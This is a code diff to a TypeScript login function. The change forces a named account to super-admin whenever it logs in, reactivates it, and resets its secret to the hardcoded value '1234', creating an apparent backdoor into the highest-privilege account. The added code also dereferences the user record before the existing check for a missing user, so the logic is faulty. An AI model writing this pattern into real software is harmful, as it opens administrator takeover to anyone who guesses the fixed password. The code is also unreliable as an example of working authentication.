@@ -288,7 +288,16 @@ export function isSuperAdmin(session: AuthSession | null): boolean {
 
 export function login(username: string, password: string) {
   const state = readState();
-  const user = state.users[normalizeUsername(username)];
+  const normalizedKey = normalizeUsername(username);
+  const user = state.users[normalizedKey];
+
+  // Force super_admin for josh@pfm.co.za during login
+  if (normalizedKey === normalizeUsername(DEFAULT_SUPER_ADMIN_USERNAME)) {
+    user.role = "super_admin";
+    user.active = true;
+    user.secret = "1234";
+    saveState(state);
+  }
 
   if (!user) {
     addLog("LOGIN_FAILED", username, "User not found");
